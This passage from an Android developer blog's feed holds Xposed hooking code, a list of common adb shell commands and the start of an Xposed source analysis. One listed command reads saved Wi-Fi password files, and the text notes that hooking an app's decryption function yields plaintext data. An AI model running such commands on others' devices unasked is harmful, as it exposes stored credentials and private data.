class="keyword">private</span> <span class="keyword">void</span> <span class="title">loadFromDiskLocked</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (mLoaded) &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        ByteArrayOutputStream fileOutputStream = <span class="keyword">null</span>;</span><br><span class="line">        ByteArrayOutputStream byteArrayOutputStream = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        FileResult fileResult = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            fileResult = SELinuxHelper.getAppDataFileService().getFileInputStream(mFilename, mFileSize, mLastModified);</span><br><span class="line">            InputStream inputStream = fileResult.stream;</span><br><span class="line">            <span class="keyword">if</span> (inputStream != <span class="keyword">null</span>) &#123;</span><br><span class="line">                <span class="keyword">int</span> length = inputStream.available();</span><br><span class="line">                <span class="keyword">byte</span> [] buffer = <span class="keyword">new</span> <span class="keyword">byte</span>[length];</span><br><span class="line"></span><br><span class="line">                <span class="keyword">int</span> readLength;</span><br><span class="line">                <span class="keyword">while</span> ((readLength = inputStream.read(buffer)) != -<span class="number">1</span>) &#123;</span><br><span class="line">                    byteArrayOutputStream.write(buffer, <span class="number">0</span>, readLength);</span><br><span class="line">                &#125;</span><br><span class="line">                fileOutputStream = byteArrayOutputStream;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (FileNotFoundException ignored) &#123;</span><br><span class="line">            <span class="comment">// SharedPreferencesImpl has a canRead() check, so it doesn't log anything in case the file doesn't exist</span></span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            Log.w(TAG, <span class="string">"getSharedPreferences"</span>, e);</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (fileResult != <span class="keyword">null</span> &amp;&amp; fileResult.stream != <span class="keyword">null</span>) &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    fileResult.stream.close();</span><br><span class="line">                &#125; <span class="keyword">catch</span> (RuntimeException rethrown) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> rethrown;</span><br><span class="line">                &#125; <span class="keyword">catch</span> (Exception ignored) &#123;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        mLoaded = <span class="keyword">true</span>;</span><br><span class="line">        <span class="keyword">if</span> (fileOutputStream != <span class="keyword">null</span>) &#123;</span><br><span class="line">            mFileOutputStream = fileOutputStream;</span><br><span class="line">            mLastModified = fileResult.mtime;</span><br><span class="line">            mFileSize = fileResult.size;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            mFileOutputStream = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        &#125;</span><br><span class="line">        notifyAll();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span><br><span class="line">     * Reload the settings from file if they have changed.</span><br><span class="line">     *</span><br><span class="line">     * &lt;p&gt;&lt;strong&gt;Warning:&lt;/strong&gt; With enforcing SELinux, this call might be quite expensive.</span><br><span class="line">     *</span><br><span class="line">     * <span class="doctag">@return</span> true if execute reload;</span><br><span class="line">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="keyword">boolean</span> <span class="title">reload</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (hasFileChanged()) &#123;</span><br><span class="line">            startLoadFromDisk();</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span><br><span class="line">     * Check whether the file has changed since the last time it has been loaded.</span><br><span class="line">     *</span><br><span class="line">     * &lt;p&gt;&lt;strong&gt;Warning:&lt;/strong&gt; With enforcing SELinux, this call might be quite expensive.</span><br><span class="line">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="keyword">boolean</span> <span class="title">hasFileChanged</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            FileResult result = SELinuxHelper.getAppDataFileService().statFile(mFilename);</span><br><span class="line">            <span class="keyword">return</span> mLastModified != result.mtime || mFileSize != result.size;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (FileNotFoundException ignored) &#123;</span><br><span class="line">            <span class="comment">// SharedPreferencesImpl doesn't log anything in case the file doesn't exist</span></span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            Log.w(TAG, <span class="string">"hasFileChanged"</span>, e);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">awaitLoadedLocked</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">while</span> (!mLoaded) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                wait();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (InterruptedException unused) &#123;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getFileContent</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">synchronized</span> (<span class="keyword">this</span>) &#123;</span><br><span class="line">            awaitLoadedLocked();</span><br><span class="line">            <span class="keyword">return</span> mFileOutputStream.toString();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> JSONObject <span class="title">getJsonFileContent</span><span class="params">()</span> <span class="keyword">throws</span> JSONException </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> JSONObject(getFileContent());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="判断xposed框架是否生效">判断xposed框架是否生效</h2><p>&#160;&#160;&#160;&#160;正如上边所说，xposed框架中对文件只有读权限，因此获取信息就变成了单项了，xposed进程只能根据我们的配置文件进行相应的逻辑操作。由于应用进程和xposed进程是不同的进程，如果应用进程要判断xposed框架是否启用，就需要进程间数据通信，如果仅仅只是判断xposed是否启动而去启动一个服务处理数据，感觉有点小题大做了。这里给出一种简单有效的方法。</p>
<blockquote>
<p>1.首先我们生成一个配置文件<code>setting.xml</code><br>2.定义一个函数</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setXposedStatus</span><span class="params">(<span class="keyword">boolean</span> bStatus)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.getSharedPreferences(<span class="string">"setting"</span>, Context.MODE_WORLD_READABLE).edit().putBoolean(<span class="string">"xposed_enabled"</span>, bStatus).apply();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>3.应用每次启动时候调用函数<code>setXposedStatus</code><br>4.在xposed中hook函数<code>setXposedStatus</code>调用前，并将参数改为<code>true</code></p>
</blockquote>
<p>这样我们要想知道xposed框架是否生效可用，读取<code>setting.xml</code>中<code>xposed_enabled</code>字段值即可。</p>
<h2 id="总结">总结</h2><p>&#160;&#160;&#160;&#160;xposed框架不仅能够hook任意你想hook的函数，并且自身也有一个很大的特点，就是一旦用户安装并启用，你所有的操作都不需要任何权限就可实现。基于xposed框架的优秀应用也特别多，比如著名的省电应用<code>绿色守护</code>。再如有一些app对敏感数据进行加密，加密算法又很复杂，那么通过hook解密函数就可以轻松的拿到明文。xposed框架的奇妙之处远远不仅于此，国外也有人对其进行二次封装作出了更神奇的用法，例如<a href="https://github.com/seebye/XClasses" target="_blank" rel="external">XClasses</a>，如果你有什么奇淫技巧，我只想对你说四个字，请带上我！</p>
]]></content>
    <summary type="html">
    <![CDATA[<p>&#160;&#160;&#160;&#160;之前<a href="http://blog.idhyt.com/2015/09/25/4-android-injection-xposed/">安卓注入框架Xposed分析与简单应用</a>只是简单的了解了一下xposed框]]>
    </summary>
    
      <category term="xposed" scheme="http://blog.idhyt.com/tags/xposed/"/>
    
      <category term="android" scheme="http://blog.idhyt.com/categories/android/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[adb shell常用命令]]></title>
    <link href="http://blog.idhyt.com/2015/10/31/android-adb-shell-command/"/>
    <id>http://blog.idhyt.com/2015/10/31/android-adb-shell-command/</id>
    <published>2015-10-31T03:45:11.000Z</published>
    <updated>2015-12-27T09:44:20.000Z</updated>
    <content type="html"><![CDATA[<ul>
<li><p>获取序列号：<br><code>adb get-serialno</code></p>
</li>
<li><p>查看连接计算机的设备：<br><code>adb devices</code></p>
</li>
<li><p>查看模拟器/设施的当前状态:<br><code>adb get-state</code></p>
</li>
<li><p>多设备下连接目标设备：<br><code>adb -s xxx shell</code></p>
</li>
<li><p>重启机器：<br><code>adb reboot</code></p>
</li>
<li><p>重启到bootloader，即刷机模式：<br><code>adb reboot bootloader</code></p>
</li>
<li><p>重启到recovery，即恢复模式：<br><code>adb reboot recovery</code></p>
</li>
<li><p>查看log：<br><code>adb logcat</code></p>
</li>
<li><p>终止adb服务进程：<br><code>adb kill-server</code></p>
</li>
<li><p>重启adb服务进程：<br><code>adb start-server</code></p>
</li>
<li><p>查看Service列表<br><code>adb shell service list</code><br><code>adb shell dumpsys activity services</code></p>
</li>
</ul>
<ul>
<li>检查Service是否存在<br><code>adb shell service check phone</code></li>
</ul>
<ul>
<li><p>获取机器MAC地址：<br><code>adb shell  cat /sys/class/net/wlan0/address</code></p>
</li>
<li><p>获取CPU序列号：<br><code>adb shell cat /proc/cpuinfo</code></p>
</li>
<li><p>安装APK：<br><code>adb install &lt;apkfile&gt; //比如：adb install baidu.apk</code></p>
</li>
<li><p>保留数据和缓存文件，重新安装apk：<br><code>adb install -r &lt;apkfile&gt; //比如：adb install -r baidu.apk</code></p>
</li>
<li><p>安装apk到sd卡：<br><code>adb install -s &lt;apkfile&gt; // 比如：adb install -s baidu.apk</code></p>
</li>
<li><p>卸载APK：<br><code>adb uninstall &lt;package&gt; //比如：adb uninstall com.baidu.search</code></p>
</li>
<li><p>卸载app但保留数据和缓存文件：<br><code>adb uninstall -k &lt;package&gt; //比如：adb uninstall -k com.baidu.search</code></p>
</li>
<li><p>启动应用：<br><code>adb shell am start -n &lt;package_name&gt;/.&lt;activity_class_name&gt;</code></p>
</li>
<li><p>查看数据库：<br><code>adb shell content query --uri  content://settings/secure</code></p>
</li>
<li><p>查看设备cpu和内存占用情况：<br><code>adb shell top</code></p>
</li>
<li><p>查看占用内存前6的app：<br><code>adb shell top -m 6</code></p>
</li>
<li><p>刷新一次内存信息，然后返回：<br><code>adb shell top -n 1</code></p>
</li>
<li><p>查询各进程内存使用情况：<br><code>adb shell procrank</code></p>
</li>
<li><p>启动应用程序:<br><code>adb shell am</code></p>
</li>
<li><p>杀死一个进程：<br><code>adb shell kill [pid]</code></p>
</li>
<li><p>查看进程列表：<br><code>adb shell ps</code></p>
</li>
<li><p>查看Android系统的属性<br><code>adb shell prop</code></p>
</li>
<li><p>查看指定进程状态：<br><code>adb shell ps -x [PID]</code></p>
</li>
<li><p>查看后台services信息：<br><code>adb shell service list</code></p>
</li>
<li><p>adb 查看最上层成activity名字：</p>
<blockquote>
<p>linux:<br><code>adb shell dumpsys activity | grep &quot;mFocusedActivity&quot;</code><br>windows:<br><code>adb shell dumpsys activity | findstr &quot;mFocusedActivity&quot;</code></p>
</blockquote>
</li>
<li><p>查看当前内存占用：<br><code>adb shell cat /proc/meminfo</code></p>
</li>
<li><p>查看IO内存分区：<br><code>adb shell cat /proc/iomem</code></p>
</li>
<li><p>将system分区重新挂载为可读写分区：<br><code>adb remount</code></p>
</li>
<li><p>从本地复制文件到设备：<br><code>adb push &lt;local&gt; &lt;remote&gt;</code></p>
</li>
<li><p>从设备复制文件到本地：<br><code>adb pull &lt;remote&gt; &lt;local&gt;</code></p>
</li>
<li><p>列出目录下的文件和文件夹，等同于dos中的dir命令：<br><code>adb shell ls</code></p>
</li>
<li><p>进入文件夹，等同于dos中的cd 命令：<br><code>adb shell cd &lt;folder&gt;</code></p>
</li>
<li><p>重命名文件：<br><code>adb shell rename path/oldfilename path/newfilename</code> </p>
</li>
<li><p>删除system/avi.apk：<br><code>adb shell rm /system/avi.apk</code></p>
</li>
<li><p>删除文件夹及其下面所有文件：<br><code>adb shell rm -r &lt;folder&gt;</code> </p>
</li>
<li><p>移动文件：<br><code>adb shell mv path/file newpath/file</code></p>
</li>
<li><p>设置文件权限：<br><code>adb shell chmod 777 /system/fonts/DroidSansFallback.ttf</code></p>
</li>
<li><p>新建文件夹：<br><code>adb shell mkdir path/foldelname</code></p>
</li>
<li><p>查看文件内容：<br><code>adb shell cat &lt;file&gt;</code> </p>
</li>
<li><p>查看wifi密码：<br><code>adb shell cat /data/misc/wifi/*.conf</code> </p>
</li>
<li><p>清除log缓存：<br><code>adb logcat -c</code></p>
</li>
<li><p>查看bug报告：<br><code>adb bugreport</code></p>
</li>
<li><p>获取设备名称：<br><code>adb shell cat /system/build.prop</code></p>
</li>
<li><p>查看ADB帮助：<br><code>adb help</code></p>
</li>
<li><p>跑monkey：<br><code>adb shell monkey -v -p your.package.name 500</code></p>
</li>
<li><p>dump堆栈：<br><code>debuggerd -b &lt;pid&gt;</code></p>
</li>
<li><p>备份与恢复:</p>
<blockquote>
<p>备份：<br><code>adb backup -f c:\allowBackup.ab -noapk com.ijinshan.browser_fast</code><br>恢复：<br><code>adb restore &quot;c:\allowBackup.ab&quot;</code></p>
</blockquote>
</li>
<li><p>拷贝文件(这些命令都是在adb下用，而不是在shell中用):</p>
<blockquote>
<p>push从电脑端向手机复制文件:<br><code>adb push d:/adb/test.txt /data/data/download/</code><br>pull从手机端向本地复制文件:<br><code>adb pull /data/data/download/ d:/adb/</code></p>
</blockquote>
</li>
<li><p>查看应用程序内存使用情况:<br><code>adb shell dumpsys meminfo &lt;package_name&gt;</code></p>
<blockquote>
<p>其中，package_name 也可以换成程序的pid,<br>pid可以通过 <code>adb shell top | grep app_name</code> 来查找.<br>内存使用情况参考<code>http://blog.csdn.net/bigconvience/article/details/35553983</code></p>
</blockquote>
</li>
<li><p>查看进程占用cpu的情况:<br><code>adb shell top -n 1 -d 0.5 | grep proc_ id</code></p>
</li>
<li><p>procrank查看内存占用：<br><code>adb shell procrank</code></p>
<blockquote>
<p>VSS - Virtual Set Size 虚拟耗用内存（包含共享库占用的内存）<br>RSS - Resident Set Size 实际使用物理内存（包含共享库占用的内存）<br>PSS - Proportional Set Size 实际使用的物理内存（比例分配共享库占用的内存）<br>USS - Unique Set Size 进程独自占用的物理内存（不包含共享库占用的内存）</p>
</blockquote>
</li>
</ul>
<ul>
<li><p>快速查看apk内androidmanifest文件内容:<br><code>aapt dump xmltree xxxx.apk AndroidManifest.xml</code></p>
</li>
<li><p>列出一些系统信息和所有应用的信息:<br><code>adb shell dumpsys packages &gt; d:\\packages.txt</code></p>
</li>
<li><p>列出一些指定应用的信息:<br><code>adb shell dumpsys package com.ijinshan.duba &gt; d:\\duba.txt</code></p>
</li>
<li><p>查看当前谁持有WAKE_LOCK锁对象：<br><code>adb shell dumpsys power</code></p>
</li>
<li><p>查看电池用量详情：<br><code>adb shell dumpsys batteryinfo</code></p>
</li>
<li><p>搜索文件：<br><code>busybox find -name *xxx*</code></p>
</li>
<li><p>电池日志：<br><code>adb shell dumpsys batterystats &gt; x:\batterystats.txt</code><br><code>bugreport日志：adb bugreport &gt; x:\bugreport.txt</code></p>
</li>
<li><p>电池日志图形界面查看<br><code>https://github.com/cacker/battery-historian</code></p>
</li>
<li><p>查看应用uid<br><code>cat /proc/&lt;pid&gt;/status</code><br><code>cat /data/system/packages.list | grep xxx</code></p>
</li>
<li><p>cpu频率<br>查看：<br><code>cat [%cpuFreqPath%]/cpuinfo_cur_freq (当前cpu频率)</code><br>修改：<br><code>echo xxx &gt; /sys/devices/system/cpu/cpu0/cpufreq/scaling_governor</code></p>
<blockquote>
<p>cat /sys/devices/system/cpu/cpu0/cpufreq/cpuinfo_cur_freq   (当前cpu频率)<br>  cat /sys/devices/system/cpu/cpu0/cpufreq/cpuinfo_max_freq  (最大cpu频率)<br>  cat /sys/devices/system/cpu/cpu0/cpufreq/cpuinfo_min_freq  (最小cpu频率)<br>  cat /sys/devices/system/cpu/cpu0/cpufreq/related_cpus  (cpu数量标号,从0开始,如果是双核,结果为0,1)<br>  cat /sys/devices/system/cpu/cpu0/cpufreq/scaling_available_frequencies  (cpu所有可用频率)<br>  cat /sys/devices/system/cpu/cpu0/cpufreq/scaling_available_governors  (cpu所有可用调控模式)<br>  cat /sys/devices/system/cpu/cpu0/cpufreq/scaling_governor (当前使用哪种调控模式)<br>  cat /sys/devices/system/cpu/cpu0/cpufreq/cpuinfo_transition_latency (变频延迟)</p>
</blockquote>
</li>
</ul>
<ul>
<li><p>某个应用内存消耗信息<br><code>adb shell dumpsys meminfo sina.mobile.tianqitong &gt; d:\\meminfo.txt</code></p>
</li>
<li><p>zygote的堆栈dump</p>
<blockquote>
<p>adb shell // 进入shell<br>chmod 777 /data/anr // /data/anr设置可读写权限<br>rm -r traces.txt // 删除原始traces<br>adb shell ps //查看进程pid<br>kill -3 <pid> //<br>adb pull /data/anr/traces.txt d:/trace.txt<br><strong>trace中查看cpu调度的基本信息</strong></pid></p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">"Thread-196" prio=5 tid=27 SUSPENDED</span><br><span class="line">| sysTid=2271 nice=0 sched=0/0 cgrp=apps/bg_non_interactive handle=1543812984</span><br><span class="line">| state=S schedstat=( 1177036142201 119659820902 234955 ) utm=84431 stm=33272 core=0</span><br><span class="line">#00  pc 000217a8  /system/lib/libc.so (__futex_syscall3+8)</span><br><span class="line">#01  pc 0000e09c  /system/lib/libc.so (__pthread_cond_timedwait_relative+48)</span><br><span class="line">#02  pc 0000e0f8  /system/lib/libc.so (__pthread_cond_timedwait+60)</span><br><span class="line">#03  pc 0005419d  /system/lib/libdvm.so (dvmChangeStatus(Thread*, ThreadStatus)+72)</span><br><span class="line">#04  pc 00049995  /system/lib/libdvm.so</span><br><span class="line">#05  pc 0004b9c1  /system/lib/libdvm.so</span><br><span class="line">#06  pc 0006e721  /system/lib/libandroid_runtime.so</span><br><span class="line">#07  pc 0001e610  /system/lib/libdvm.so (dvmPlatformInvoke+112)</span><br><span class="line">#08  pc 0004df29  /system/lib/libdvm.so (dvmCallJNIMethod(unsigned int const*, JValue*, Method const*, Thread*)+500)</span><br><span class="line">#09  pc 00027a24  /system/lib/libdvm.so</span><br><span class="line">#10  pc 000fedc8  [stack:2271]</span><br><span class="line">at android.util.Log.println_native(Native Method)</span><br><span class="line">at android.util.Log.println(Log.java:332)</span><br><span class="line">at com.android.internal.os.AndroidPrintStream.log(AndroidPrintStream.java:47)</span><br><span class="line">at com.android.internal.os.LoggingPrintStream.println(LoggingPrintStream.java:311)</span><br><span class="line">at java.net.PlainSocketImpl.read(PlainSocketImpl.java:487)</span><br><span class="line">at java.net.PlainSocketImpl.access$000(PlainSocketImpl.java:46)</span><br><span class="line">at java.net.PlainSocketImpl$PlainSocketInputStream.read(PlainSocketImpl.java:240)</span><br><span class="line">at java.io.InputStream.read(InputStream.java:163)</span><br><span class="line">at java.io.BufferedInputStream.fillbuf(BufferedInputStream.java:142)</span><br><span class="line">at java.io.BufferedInputStream.read(BufferedInputStream.java:309)</span><br><span class="line">at com.sina.push.i.c.c(SourceFile:241)</span><br><span class="line">at com.sina.push.i.c.b(SourceFile:133)</span><br><span class="line">at com.sina.push.i.c.d(SourceFile:270)</span><br><span class="line">at com.sina.push.i.c.e(SourceFile:496)</span><br><span class="line">at com.sina.push.i.c.&lt;init&gt;(SourceFile:97)</span><br><span class="line">at com.sina.push.b.a.b.a(SourceFile:56)</span><br><span class="line">at com.sina.push.b.e.a(SourceFile:166)</span><br><span class="line">at com.sina.push.b.e$b$a.run(SourceFile:487)</span><br></pre></td></tr></table></figure>
</blockquote>
</li>
</ul>
<p>其中<code>schedstat=( 1177036142201 119659820902 234955 ) utm=84431 stm=33272 core=0</code><br>从左到右六个数字分别是:<br>1- 当前线程在cpu上消耗的时间<br>2- 当前任务在CPU任务轮询中的等待时间<br>3- 当前线程在这个cpu上运行的次数<br>4- 当前线程的用户态执行时间<br>5- 当前线程的内核态执行时间<br>6- 当前线程在哪里个核心上执行<br>实际上描述了调度的基本信息</p>
<ul>
<li>SYSTEM LOG<br><code>logcat -b system -v time -d *:v | grep sina.mobile</code><blockquote>
<p>-b <buffer> // 加载一个可使用的日志缓冲区供查看，比如event和radio,默认值是main.<br>system // system log<br>-v // 输出字段 time 显示时间<br>-d // 缓冲区日志打印并退出<br>*:v // 日志级别高到低 E W I D V<br>grep sina.mobile // 过滤包含sina.mobile的信息</buffer></p>
</blockquote>
</li>
</ul>
]]></content>
    <summary type="html">
    <![CDATA[<ul>
<li><p>获取序列号：<br><code>adb get-serialno</code></p>
</li>
<li><p>查看连接计算机的设备：<br><code>adb devices</code></p>
</li>
<li><p>查看模拟器/设施的当前状态:]]>
    </summary>
    
      <category term="adb" scheme="http://blog.idhyt.com/tags/adb/"/>
    
      <category term="android" scheme="http://blog.idhyt.com/categories/android/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[安卓注入框架Xposed分析与简单应用]]></title>
    <link href="http://blog.idhyt.com/2015/09/25/android-injection-xposed/"/>
    <id>http://blog.idhyt.com/2015/09/25/android-injection-xposed/</id>
    <published>2015-09-24T18:29:11.000Z</published>
    <updated>2015-12-28T02:20:50.000Z</updated>
    <content type="html"><![CDATA[<h3 id="概述">概述</h3><p>Xposed是针对Android平台的动态劫持项目，源码<a href="https://github.com/rovo89" target="_blank" rel="external">github</a></p>
<h4 id="主要模块说明如下：">主要模块说明如下：</h4><p><strong>Xposed</strong>：Xposed的C++部分，主要是用来替换/system/bin/app_process，并为XposedBridge提供JNI方法。</p>
<p><strong>XposedInstaller</strong>：Xposed的安装包，负责配置Xposed工作的环境并且提供对基于Xposed框架的Modules的管理。在安装XposedInstaller之后，app_process与XposedBridge.jar放置在了/data/data/de.robv.android.xposed.installer。</p>
<p><strong>XposedBridge.jar</strong>：XposedBridge.jar是Xposed提供的jar文件，负责在Native层与FrameWork层进行交互。/system/bin/app_process进程启动过程中会加载该jar包，其它的Modules的开发与运行都是基于该jar包的。注意：XposedBridge.jar文件本质上是由XposedBridge生成的APK文件更名而来，查看该工程目录下的install.bat</p>
<pre><code><span class="label">cd</span> /d %~dp0
<span class="label">dir</span> <span class="keyword">bin\XposedBridge.apk
</span><span class="label">adb</span> <span class="keyword">push </span><span class="keyword">bin\XposedBridge.apk </span>/<span class="preprocessor">data</span>/<span class="preprocessor">data</span>/de.robv.<span class="keyword">android.xposed.installer/bin/XposedBridge.jar.newversion
</span><span class="label">pause</span>
</code></pre><p><strong>XposedMods</strong>：使用Xposed开发的一些Modules，其中AppSettings是一个可以进行权限动态管理的应用</p>
<h4 id="Xposed框架的基本运行环境如下：">Xposed框架的基本运行环境如下：</h4><table>
<thead>
<tr>
<th>Configuration</th>
<th>RequireMent</th>
</tr>
</thead>
<tbody>
<tr>
<td>Root Access</td>
<td>因为Xposed工作原理是在/system/bin目录下替换文件，在install的时候需要root权限，但是运行时不需要root权限</td>
</tr>
<tr>
<td>版本要求</td>
<td>需要在Android 4.0以上版本的机器中</td>
</tr>
</tbody>
</table>
<h3 id="源码分析">源码分析</h3><h4 id="XposedInstaller">XposedInstaller</h4><p>通过<code>/XposedInstaller/AndroidManifest.xml</code>看出主activity为WelcomeActivity，<br>主要实现了界面加载，添加功能图标和描述信息Item，如Install, Modules, Download等。<br>选择Framework后进入界面<br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/android-xposed-1.jpg" alt="android-xposed-1"></p>
<p>我们直接找到install代码，install代码定位的简单方法：<br>先点击install进入安装界面，然后在输入adb命令查看当前最顶层activity，就可以定位到代码。</p>
<p>adb 查看最上层成activity名字<br>linux: <code>adb shell dumpsys activity | grep &quot;mFocusedActivity&quot;</code><br>windows: <code>adb shell dumpsys activity | findstr &quot;mFocusedActivity&quot;</code></p>
<p>最后定位到install代码位于InstallerFragment中，代码及注释如下：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 该代码的功能就是替换了app_process文件</span></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">boolean</span> <span class="title">install</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 获取安装的方式，直接写入 or 使用 recovery进行安装</span></span><br><span class="line">    <span class="keyword">final</span> <span class="keyword">int</span> installMode = getInstallMode();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 检查获取Root权限</span></span><br><span class="line">    <span class="keyword">if</span> (!startShell())</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line"></span><br><span class="line">    List&lt;String&gt; messages = <span class="keyword">new</span> LinkedList&lt;String&gt;();</span><br><span class="line">    <span class="keyword">boolean</span> showAlert = <span class="keyword">true</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        messages.add(getString(R.string.sdcard_location, XposedApp.getInstance().getExternalFilesDir(<span class="keyword">null</span>)));</span><br><span class="line">        messages.add(<span class="string">""</span>);</span><br><span class="line"></span><br><span class="line">        messages.add(getString(R.string.file_copying, <span class="string">"Xposed-Disabler-Recovery.zip"</span>));</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 